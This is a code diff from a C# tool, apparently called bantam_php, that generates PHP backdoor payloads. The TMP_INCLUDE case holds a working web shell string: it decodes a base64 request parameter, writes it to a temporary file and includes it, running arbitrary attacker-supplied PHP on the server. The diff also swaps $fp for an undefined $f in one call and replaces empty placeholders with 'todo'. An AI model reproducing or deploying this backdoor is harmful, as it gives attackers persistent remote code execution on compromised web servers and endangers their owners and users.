@@ -66,20 +66,20 @@ namespace bantam_php
                 case BackdoorTypes.NATIVE_ANON:
                     {
                         //TODO
-                        //backdoor = "";
+                        backdoor = "todo";
                         break;
                     }
 
                 case BackdoorTypes.TMP_INCLUDE:
                     {
-                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($fp);\r\n}";
+                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($f);\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.PREG_REPLACE:
                     {
                         //TODO
-                        backdoor = "";
+                        backdoor = "todo";
                         break;
                     }
             }
